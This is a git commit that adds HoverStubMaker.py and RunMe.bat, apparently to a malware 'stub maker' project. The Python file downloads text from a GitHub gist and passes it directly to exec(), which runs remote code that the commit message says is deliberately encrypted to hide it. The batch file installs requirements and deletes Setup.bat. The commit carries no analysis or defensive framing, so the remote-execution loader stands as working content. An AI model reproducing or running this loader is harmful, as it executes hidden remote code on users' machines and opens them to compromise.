b692e825829fd475a329567698b2736a15d8f320
Krynix <77754019+Domman19@users.noreply.github.com>
2022-10-22 17:35:48 +0100

    Its Encrypted bc of skids

---
+++ HoverStubMaker.py
@@ -0,0 +1,2 @@
+import requests
+exec(str(requests.get('https://gist.githubusercontent.com/Domman19/ee5cf101d0d9efd0c3e4a67b6ab1fea9/raw/af707e9bb554e7daeb071ae4d1fcc1b0c4df3d04/HoverBuilderENC').text))
---
+++ RunMe.bat
@@ -0,0 +1,3 @@
+@echo off
+pip install -r requirements.txt
+del Setup.bat
